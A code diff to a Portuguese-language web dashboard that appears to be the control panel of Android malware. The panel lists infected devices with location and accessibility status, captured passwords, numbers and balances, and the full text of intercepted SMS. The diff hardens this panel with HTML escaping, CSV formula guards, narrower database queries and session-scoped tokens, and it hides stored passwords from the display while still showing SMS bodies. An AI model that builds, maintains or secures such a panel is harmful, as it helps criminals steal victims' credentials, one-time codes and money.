@@ -938,7 +938,7 @@ const SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsI
 
 const headers = {
   "apikey": SUPA_KEY,
-  "Authorization": "Bearer " + SUPA_KEY,
+  "Authorization": "Bearer ",
   "Content-Type": "application/json"
 };
 
@@ -959,6 +959,9 @@ function escapeHtml(str) {
     .replace(/>/g, '&gt;')
     .replace(/"/g, '&quot;')
     .replace(/'/g, '&#39;');
+}
+function jsArg(value) {
+  return escapeHtml(JSON.stringify(String(value == null ? '' : value)));
 }
 
 // ── ESTADO DOS FILTROS & ORDENAÇÃO ────────────────────────────────────
@@ -1018,7 +1021,7 @@ function getTipoLabel(tipo) {
     "senha_nova":"🔑 Senha alterada","numero_novo":"📞 Número alterado","saldo":"💰 Saldo capturado",
     "login":"🔓 Login efectuado","senha":"🔑 Senha","numero":"📞 Número"
   };
-  return map[tipo] || "📌 " + tipo;
+  return Object.prototype.hasOwnProperty.call(map, tipo) ? map[tipo] : "📌 " + escapeHtml(tipo || "Actividade");
 }
 
 function getTipoDot(tipo) {
@@ -1089,13 +1092,13 @@ function actualizarDropdowns() {
 // ════════════════════════════════════════════════════════════════════════
 
 // Map: device_id → lista de sinais
-const sinaisPorDevice = {};
+const sinaisPorDevice = Object.create(null);
 
 async function carregarSinais() {
   try {
     const trintaDiasAtras = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
     const rSin = await fetch(
-      SUPA_URL + `/rest/v1/sinais?select=*&created_at=gte.${trintaDiasAtras}&order=created_at.desc&limit=1000`,
+      SUPA_URL + `/rest/v1/sinais?select=device_id,created_at,protecao,alc_min,alc_max,confianca,crash_real,prot_ok,alc_ok&created_at=gte.${trintaDiasAtras}&order=created_at.desc&limit=1000`,
       { headers }
     );
     if (!rSin.ok) return;
@@ -1390,15 +1393,12 @@ function aplicarFiltros() {
 
     // Filtro texto
     if (q) {
-      const devCreds = todasCredenciais.filter(c => c.device_id===d.device_id);
-      const numeros  = devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero").map(c=>c.valor||"").join(" ");
-      const pais     = (d.pais||"").toLowerCase();
-      const cidade   = (d.cidade||"").toLowerCase();
+      const pais = (d.pais||"").toLowerCase();
+      const cidade = (d.cidade||"").toLowerCase();
       if (!(
         (d.device_id||"").toLowerCase().includes(q) ||
         (d.modelo||"").toLowerCase().includes(q) ||
         (d.versao||"").toLowerCase().includes(q) ||
-        numeros.toLowerCase().includes(q) ||
         pais.includes(q) || cidade.includes(q)
       )) return false;
     }
@@ -1423,28 +1423,28 @@ function aplicarFiltros() {
 // ════════════════════════════════════════════════════════════════════════
 
 function exportarCSV() {
-  const rows = [
-    ["device_id","modelo","android","versao","ultimo_acesso","pais","cidade","numero","senha","num_credenciais","num_sms"]
-  ];
+  // Apenas metadados operacionais; nunca exportar números, senhas ou SMS.
+  const rows = [["device_id","modelo","android","versao","ultimo_acesso","pais","cidade","num_registos_actividade","num_sms"]];
   todosDispositivos.forEach(d => {
-    const creds  = todasCredenciais.filter(c => c.device_id===d.device_id);
-    const numero = creds.find(c=>c.tipo==="Numero"||c.tipo==="numero")?.valor || "";
-    const senha  = creds.find(c=>c.tipo==="Senha"||c.tipo==="senha")?.valor || "";
-    const nSMS   = todasSMS.filter(s => s.device_id===d.device_id).length;
-    rows.push([
-      d.device_id||"", d.modelo||"", d.android||"", d.versao||"",
-      d.ultimo_acesso||"", d.pais||"", d.cidade||"",
-      numero, senha, creds.length, nSMS
-    ]);
+    const nCreds = todasCredenciais.filter(c => c.device_id === d.device_id).length;
+    const nSMS = todasSMS.filter(s => s.device_id === d.device_id).length;
+    rows.push([d.device_id||"",d.modelo||"",d.android||"",d.versao||"",d.ultimo_acesso||"",d.pais||"",d.cidade||"",nCreds,nSMS]);
   });
-  const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(",")).join("\n");
-  const blob = new Blob(["\uFEFF"+csv], { type:"text/csv;charset=utf-8;" });
-  const url  = URL.createObjectURL(blob);
-  const a    = document.createElement("a");
+  const csvCell = value => {
+    let cell = String(value == null ? "" : value);
+    if (/^[\s\u0000-\u001F]*[=+\-@]/.test(cell)) cell = "'" + cell;
+    return '"' + cell.replace(/"/g, '""') + '"';
+  };
+  const csv = rows.map(row => row.map(csvCell).join(",")).join("\n");
+  const blob = new Blob(["\uFEFF" + csv], {type:"text/csv;charset=utf-8;"});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
   a.href = url;
   a.download = "nexus_dispositivos_" + new Date().toISOString().slice(0,10) + ".csv";
+  document.body.appendChild(a);
   a.click();
-  URL.revokeObjectURL(url);
+  a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
 }
 
 // ════════════════════════════════════════════════════════════════════════
@@ -1453,123 +1453,56 @@ function exportarCSV() {
 
 function renderLista(dispositivos, credenciais) {
   const lista = document.getElementById("lista");
-  if (!dispositivos.length) {
-    lista.innerHTML = '<div class="empty">Nenhum dispositivo encontrado</div>';
-    return;
-  }
-
+  if (!dispositivos.length) { lista.innerHTML = '<div class="empty">Nenhum dispositivo encontrado</div>'; return; }
   lista.innerHTML = dispositivos.map(dev => {
-    const devCreds   = credenciais.filter(c => c.device_id===dev.device_id);
-    const activo     = isHoje(dev.ultimo_acesso);
-    const desact     = versaoAtual && dev.versao && dev.versao !== versaoAtual;
-    const locStr     = [dev.cidade, dev.pais].filter(Boolean).join(", ");
+    const devCreds = credenciais.filter(c => c.device_id === dev.device_id);
+    const activo = isHoje(dev.ultimo_acesso);
+    const desact = versaoAtual && dev.versao && dev.versao !== versaoAtual;
+    const locStr = [dev.cidade,dev.pais].filter(Boolean).join(", ");
     const acessAtiva = dev.acessibilidade_ativa === true;
-
+    const idArg = jsArg(dev.device_id), idAttr = escapeHtml(dev.device_id || "");
     return `
-    <div class="device-card" id="card-${dev.device_id}">
-      <div class="device-row" onclick="toggleCard('${dev.device_id}')">
-        <div class="device-info">
-          <div class="device-avatar">${getEmoji(dev.modelo)}</div>
-          <div>
-            <div class="device-name">
-              ${escapeHtml(dev.modelo) || "Desconhecido"}
-              ${desact ? `<span style="font-family:var(--mono);font-size:9px;color:#f97316;border:1px solid rgba(249,115,22,0.3);border-radius:4px;padding:1px 5px;margin-left:4px">⚠ ${escapeHtml(dev.versao)}</span>` : ""}
-            </div>
-            <div class="device-id">${dev.device_id?.substring(0,16) || "—"}... ${locStr ? `· ${locStr}` : ""}</div>
-          </div>
+    <div class="device-card" id="card-${idAttr}">
+      <div class="device-row" onclick="toggleCard(${idArg})">
+        <div class="device-info"><div class="device-avatar">${getEmoji(dev.modelo)}</div><div>
+          <div class="device-name">${escapeHtml(dev.modelo)||"Desconhecido"} ${desact?`<span>⚠ ${escapeHtml(dev.versao)}</span>`:""}</div>
+          <div class="device-id">${escapeHtml((dev.device_id||"").substring(0,16))}... ${locStr?`· ${escapeHtml(locStr)}`:""}</div>
+        </div></div>
+        <div class="cell hide-mobile">${escapeHtml(dev.versao||"—")}</div>
+        <div class="cell hide-mobile">${escapeHtml(formatDate(dev.ultimo_acesso))}</div>
+        <div class="cell hide-mobile">Oculto</div>
+        <div><span>${acessAtiva?"♿ ON":"♿ OFF"}</span> <span class="badge ${activo?"active":"idle"}">${activo?"ACTIVO":"INACTIVO"}</span></div>
+      </div>
+      <div class="history-panel"><div class="history-inner"><div class="history-grid">
+        <div class="info-block"><h4>📱 Dispositivo</h4>
+          <div class="info-row"><span class="info-label">Modelo</span><span class="info-val">${escapeHtml(dev.modelo)||"—"}</span></div>
+          <div class="info-row"><span class="info-label">Android</span><span class="info-val">${escapeHtml(dev.android||"—")}</span></div>
+          <div class="info-row"><span class="info-label">Versão App</span><span class="info-val">${escapeHtml(dev.versao||"—")}</span></div>
+          <div class="info-row"><span class="info-label">Device ID</span><span class="info-val">${idAttr||"—"}</span></div>
+          ${locStr?`<div class="info-row"><span class="info-label">📍 Localização</span><span class="info-val">${escapeHtml(locStr)}</span></div>`:""}
         </div>
-        <div class="cell hide-mobile" style="color:${desact?"#f97316":"var(--text)"}">${dev.versao || "—"}</div>
-        <div class="cell hide-mobile">${formatDate(dev.ultimo_acesso)}</div>
-        <div class="cell hide-mobile">${devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||dev.numero||"—"}</div>
-        <div style="display:flex;align-items:center;gap:8px;justify-content:flex-end">
-          <span title="${acessAtiva ? 'Acessibilidade activa' : 'Acessibilidade inactiva'}" style="font-size:11px;font-family:var(--mono);padding:2px 7px;border-radius:4px;border:1px solid ${acessAtiva ? 'rgba(34,197,94,.3)' : 'rgba(239,68,68,.3)'};background:${acessAtiva ? 'rgba(34,197,94,.08)' : 'rgba(239,68,68,.08)'};color:${acessAtiva ? 'var(--green)' : 'var(--red)'};">${acessAtiva ? '♿ ON' : '♿ OFF'}</span>
-          <span class="badge ${activo ? 'active' : 'idle'}">${activo ? 'ACTIVO' : 'INACTIVO'}</span>
-          <span class="chevron">▼</span>
+        <div class="info-block"><h4>📊 Actividade</h4>
+          <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val">${escapeHtml(formatDate(dev.ultimo_acesso))}</span></div>
+          <div class="info-row"><span class="info-label">Registos</span><span class="info-val">${devCreds.length} (conteúdo protegido)</span></div>
+          <div class="info-row"><span class="info-label">Estado</span><span class="info-val">${activo?"Activo hoje":"Inactivo"}</span></div>
+          <div class="info-row"><span class="info-label">Acessibilidade</span><span class="info-val">${acessAtiva?"Activa":"Inactiva"}</span></div>
         </div>
       </div>
-
-      <div class="history-panel">
-        <div class="history-inner">
-          <div class="history-grid">
-            <div class="info-block">
-              <h4>📱 Dispositivo</h4>
-              <div class="info-row"><span class="info-label">Modelo</span><span class="info-val">${escapeHtml(dev.modelo)||"—"}</span></div>
-              <div class="info-row"><span class="info-label">Android</span><span class="info-val">${dev.android||"—"}</span></div>
-              <div class="info-row"><span class="info-label">Versão App</span><span class="info-val ${desact?"":"green"}" style="${desact?"color:#f97316":""}">${dev.versao||"—"}${desact?` (desact · atual: ${versaoAtual})`:""}</span></div>
-              <div class="info-row"><span class="info-label">Device ID</span><span class="info-val" style="font-size:10px">${dev.device_id||"—"}</span></div>
-              ${locStr ? `<div class="info-row"><span class="info-label">📍 Localização</span><span class="info-val">${locStr}</span></div>` : ""}
-            </div>
-            <div class="info-block">
-              <h4>📊 Actividade</h4>
-              <div class="info-row"><span class="info-label">Instalação</span><span class="info-val">${formatDate(dev.timestamp||dev.created_at)}</span></div>
-              <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val green">${formatDate(dev.ultimo_acesso)}</span></div>
-              <div class="info-row"><span class="info-label">Credenciais</span><span class="info-val ${devCreds.length?"red":""}">${devCreds.length} registos</span></div>
-              <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||dev.numero||'—'}</span></div>
-              <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||dev.senha||'—'}</span></div>
-              <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo?"green":""}">${activo?"Activo hoje":"Inactivo"}</span></div>
-              <div class="info-row"><span class="info-label">Acessibilidade</span><span class="info-val" style="color:${acessAtiva?'var(--green)':'var(--red)'}">${acessAtiva?'✅ Activa':'❌ Inactiva'}</span></div>
-            </div>
-          </div>
-
-          <!-- Histórico de sinais individualizado por dispositivo -->
-          <div class="timeline-title" style="margin-bottom:10px">
-            🎯 Histórico de sinais
-            <span style="font-size:9px;color:var(--muted);font-weight:400;margin-left:6px" id="sinais-label-${dev.device_id}">
-              <span class="sinais-resumo">${(()=>{const ss=sinaisPorDevice[dev.device_id]||[];const cr=ss.filter(s=>s.crashReal!=null);return cr.length?cr.length+" com resultado · taxa: "+Math.round(cr.filter(s=>s.alcOk).length/cr.length*100)+"%":ss.length?ss.length+" sinais":"carregando..."})()}</span>
-            </span>
-          </div>
-          <div class="device-sinais-container" data-device-id="${dev.device_id}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
-
-          <div class="timeline-title" style="margin-top:16px">📋 Histórico de actividade</div>
-          <div class="timeline">
-            ${devCreds.length === 0
-              ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem credenciais registadas</div>'
-              : devCreds.map(c => `
-                <div class="tl-item">
-                  <div class="tl-dot ${getTipoDot(c.tipo)}"></div>
-                  <div class="tl-time">${formatDate(c.criado_em||c.created_at)}</div>
-                  <div class="tl-content">
-                    <div class="tipo">${getTipoLabel(c.tipo)}
-                      <span class="cred-capturado-em" title="Momento exacto da captura">🕒 ${formatDateHora(c.criado_em||c.created_at)}</span>
-                    </div>
-                    <div>${c.numero?'📞 '+escapeHtml(c.numero):''}${c.senha?' · 🔑 '+escapeHtml(c.senha):''}${c.valor?escapeHtml(c.valor):''}</div>
-                  </div>
-                </div>
-              `).join('')
-            }
-          </div>
-
-          <div class="timeline-title" style="margin-top:16px;display:flex;align-items:center;gap:8px;cursor:pointer" onclick="toggleSMS('${dev.device_id}')">
-            💬 SMS recebidas
-            <span style="font-size:11px;color:var(--muted);font-family:var(--mono)">(${todasSMS.filter(s=>s.device_id===dev.device_id).length} mensagens)</span>
-            <span id="sms-chevron-${dev.device_id}" style="font-size:10px;transition:transform 0.2s">▶</span>
-          </div>
-          <div class="timeline" id="sms-${dev.device_id}" style="display:none;max-height:400px;overflow-y:auto">
-            ${todasSMS.filter(s=>s.device_id===dev.device_id).length===0
-              ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem SMS registadas</div>'
-              : todasSMS.filter(s=>s.device_id===dev.device_id).map(s=>`
-                <div class="tl-item">
-                  <div class="tl-dot login"></div>
-                  <div class="tl-time">${formatDate(new Date(s.timestamp_ms).toISOString())}</div>
-                  <div class="tl-content">
-                    <div class="tipo">📨 ${escapeHtml(s.remetente)||'Desconhecido'}</div>
-                    <div style="word-break:break-word;font-size:12px;color:var(--muted)">${escapeHtml(s.corpo)}</div>
-                  </div>
-                </div>
-              `).join('')
-            }
-          </div>
-
-          <!-- Botões de acção -->
-          <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
-            <button onclick="forcarAtualizacao('${dev.device_id}')" style="background:var(--surface2);border:1px solid var(--accent);color:var(--accent);font-family:var(--mono);font-size:11px;padding:8px 14px;border-radius:8px;cursor:pointer;transition:all 0.2s" onmouseover="this.style.background='rgba(124,58,237,0.1)'" onmouseout="this.style.background='var(--surface2)'">
-              🔄 Forçar actualização deste dispositivo
-            </button>
-          </div>
-        </div>
+      <div class="timeline-title">🎯 Histórico de sinais <span id="sinais-label-${idAttr}"><span class="sinais-resumo">${(()=>{const ss=sinaisPorDevice[dev.device_id]||[],cr=ss.filter(s=>s.crashReal!=null);return cr.length?cr.length+" com resultado · taxa: "+Math.round(cr.filter(s=>s.alcOk).length/cr.length*100)+"%":ss.length?ss.length+" sinais":"carregando..."})()}</span></span></div>
+      <div class="device-sinais-container" data-device-id="${idAttr}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
+      <div class="timeline-title">📋 Histórico de actividade</div>
+      <div class="timeline">${devCreds.length===0?'<div class="empty">Sem registos</div>':devCreds.map(c=>`
+        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">${escapeHtml(formatDate(c.criado_em))}</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>Conteúdo sensível ocultado</div></div></div>
+      `).join("")}</div>
+      <div class="timeline-title" onclick="toggleSMS(${idArg})">💬 SMS recebidas (${todasSMS.filter(s=>s.device_id===dev.device_id).length}) <span id="sms-chevron-${idAttr}">▶</span></div>
+      <div class="timeline" id="sms-${idAttr}" style="display:none">
+        ${todasSMS.filter(s=>s.device_id===dev.device_id).map(s=>{const ms=Number(s.timestamp_ms),t=Number.isFinite(ms)?formatDate(new Date(ms).toISOString()):"—";return `
+          <div class="tl-item"><div class="tl-dot login"></div><div class="tl-time">${escapeHtml(t)}</div><div class="tl-content"><div class="tipo">📨 ${escapeHtml(s.remetente)||"Desconhecido"}</div><div>${escapeHtml(s.corpo)}</div></div></div>`;
+        }).join("")}
       </div>
-    </div>
-    `;
+      <div><button onclick="forcarAtualizacao(${idArg})" class="btn btn-primary">🔄 Forçar actualização deste dispositivo</button></div>
+      </div></div>
+    </div>`;
   }).join("");
 }
 
@@ -1587,7 +1520,7 @@ function renderHistoricoSinaisDevice(deviceId) {
   const ultimos = [...sinais].slice(0, 10); // já vêm ordenados desc
   const comRes  = sinais.filter(s => s.crashReal != null);
   const taxa    = comRes.length ? Math.round(comRes.filter(s=>s.alcOk).length/comRes.length*100) : null;
-  const devIdEsc = escapeHtml(deviceId);
+  const devIdEsc = jsArg(deviceId);
   return `<div class="sinais-grid">
     ${ultimos.map(s => {
       const classe = s.crashReal==null ? "pendente" : s.alcOk ? "acerto" : s.protOk ? "prot" : "erro";
@@ -1765,11 +1698,11 @@ async function carregarDados() {
 
   try {
     const [r1,r3] = await Promise.all([
-      fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", {headers}),
-      fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", {headers})
+      fetch(SUPA_URL+"/rest/v1/installs?select=device_id,modelo,android,versao,ultimo_acesso,pais,cidade,acessibilidade_ativa&order=ultimo_acesso.desc.nullslast&limit=1000", {headers}),
+      fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms,remetente,corpo&order=timestamp_ms.desc&limit=1000", {headers})
     ]);
     const d1=await r1.json(), d3=await r3.json();
-    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc");
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,criado_em&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1802,45 +1735,43 @@ let sessionToken = null; // JWT do utilizador autenticado
 
 // Actualizar headers com o token da sessão autenticada
 function getHeaders() {
-  return {
-    "apikey":        SUPA_KEY,
-    "Authorization": "Bearer " + (sessionToken || SUPA_KEY),
-    "Content-Type":  "application/json"
-  };
+  if (!sessionToken) throw new Error("Sessão não autenticada");
+  return { "apikey": SUPA_KEY, "Authorization": "Bearer " + sessionToken, "Content-Type": "application/json" };
 }
 
-// Restaurar sessão guardada no localStorage (evita login a cada reload)
+// A sessão fica limitada à aba. sessionStorage ainda é acessível a JavaScript;
+// cookies HttpOnly num backend são necessários para protecção mais forte contra XSS.
 async function restaurarSessao() {
-  const stored = localStorage.getItem("nexus_session");
+  localStorage.removeItem("nexus_session");
+  const stored = sessionStorage.getItem("nexus_session");
   if (!stored) return false;
   try {
     const { access_token, refresh_token, expires_at } = JSON.parse(stored);
-    // Se o token ainda é válido (expira daqui a mais de 60s)
-    if (expires_at && Date.now() / 1000 < expires_at - 60) {
+    if (typeof access_token !== "string" || typeof refresh_token !== "string") throw new Error("Sessão inválida");
+    if (expires_at && Date.now()/1000 < expires_at - 60) {
       sessionToken = access_token;
-      // Actualizar headers globais
       headers.Authorization = "Bearer " + sessionToken;
       return true;
     }
-    // Token expirado — tentar renovar com refresh_token
     const r = await fetch(SUPA_URL + "/auth/v1/token?grant_type=refresh_token", {
-      method: "POST",
-      headers: { "apikey": SUPA_KEY, "Content-Type": "application/json" },
+      method: "POST", headers: { "apikey": SUPA_KEY, "Content-Type": "application/json" },
       body: JSON.stringify({ refresh_token })
     });
     if (r.ok) {
       const data = await r.json();
+      if (!data.access_token || !data.refresh_token) throw new Error("Renovação inválida");
       sessionToken = data.access_token;
       headers.Authorization = "Bearer " + sessionToken;
-      localStorage.setItem("nexus_session", JSON.stringify({
-        access_token:  data.access_token,
-        refresh_token: data.refresh_token,
-        expires_at:    Math.floor(Date.now()/1000) + data.expires_in
+      sessionStorage.setItem("nexus_session", JSON.stringify({
+        access_token:data.access_token, refresh_token:data.refresh_token,
+        expires_at:Math.floor(Date.now()/1000)+data.expires_in
       }));
       return true;
     }
   } catch(_) {}
-  localStorage.removeItem("nexus_session");
+  sessionStorage.removeItem("nexus_session");
+  sessionToken = null;
+  headers.Authorization = "Bearer ";
   return false;
 }
 
@@ -1872,10 +1803,9 @@ async function fazerLogin() {
     // Guardar sessão para reload sem novo login
     sessionToken = data.access_token;
     headers.Authorization = "Bearer " + sessionToken;
-    localStorage.setItem("nexus_session", JSON.stringify({
-      access_token:  data.access_token,
-      refresh_token: data.refresh_token,
-      expires_at:    Math.floor(Date.now()/1000) + data.expires_in
+    sessionStorage.setItem("nexus_session", JSON.stringify({
+      access_token:data.access_token, refresh_token:data.refresh_token,
+      expires_at:Math.floor(Date.now()/1000)+data.expires_in
     }));
 
     autenticado = true;
@@ -1895,7 +1825,9 @@ async function sair() {
       headers: { "apikey": SUPA_KEY, "Authorization": "Bearer " + sessionToken }
     }).catch(()=>{});
   }
+  sessionStorage.removeItem("nexus_session");
   localStorage.removeItem("nexus_session");
+  sessionToken = null;
   location.reload();
 }
 
@@ -1907,11 +1839,11 @@ function iniciarPainel() {
     const h = getHeaders();
     try {
       const [r1,r3] = await Promise.all([
-        fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=100",{headers:h}),
-        fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000",{headers:h})
+        fetch(SUPA_URL+"/rest/v1/installs?select=device_id,modelo,android,versao,ultimo_acesso,pais,cidade,acessibilidade_ativa&order=ultimo_acesso.desc.nullslast&limit=100",{headers:h}),
+        fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms,remetente,corpo&order=timestamp_ms.desc&limit=1000",{headers:h})
       ]);
       const d1=await r1.json(), d3=await r3.json();
-      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc");
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,criado_em&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
@@ -2196,7 +2128,7 @@ async function carregarDiagnostico() {
   try {
     const seteAtras = new Date(Date.now() - 7*24*60*60*1000).toISOString();
     const r = await fetch(
-      SUPA_URL + '/rest/v1/logs_ia_erros?select=*&created_at=gte.' + seteAtras + '&order=created_at.desc&limit=500',
+      SUPA_URL + '/rest/v1/logs_ia_erros?select=id,device_id,created_at,tipo,detalhe,velas&created_at=gte.' + seteAtras + '&order=created_at.desc&limit=500',
       { headers }
     );
 
@@ -2222,7 +2154,8 @@ async function carregarDiagnostico() {
     if (badge) badge.textContent = todosErrosIA.length;
 
   } catch(e) {
-    document.getElementById('diag-lista').innerHTML = '<div class="diag-empty">❌ ' + e.message + '</div>';
+    const erroEl = document.getElementById('diag-lista');
+    if (erroEl) erroEl.textContent = '❌ ' + String(e.message || 'Erro desconhecido');
   }
 }
 
@@ -2268,7 +2201,7 @@ function renderDiag() {
   (todosDispositivos || []).forEach(d => { deviceMap[d.device_id] = d.modelo || d.device_id?.slice(0,10); });
 
   const rows = erros.map(e => {
-    const cfg      = tipoConfig[e.tipo] || { cls:'excecao', label: e.tipo };
+    const cfg      = tipoConfig[e.tipo] || { cls:'excecao', label:'Tipo de erro não reconhecido' };
     const devLabel = escapeHtml(deviceMap[e.device_id] || (e.device_id || '-').slice(0, 12) + '...');
     const quando   = e.created_at ? formatarTempo(new Date(e.created_at)) : '-';
     const detalhe  = escapeHtml(e.detalhe || '-');
@@ -2280,7 +2213,7 @@ function renderDiag() {
       + '<div><span class="diag-tipo '+cls+'">'+label+'</span></div>'
       + '<div class="diag-detalhe" title="'+detalhe+'">'+detalhe+'</div>'
       + '<div class="diag-ts">'+quando+'</div>'
-      + '<div class="diag-velas">'+(e.velas!=null?e.velas:'-')+'</div>'
+      + '<div class="diag-velas">'+escapeHtml(e.velas!=null?e.velas:'-')+'</div>'
       + '</div>';
   }).join('');
 
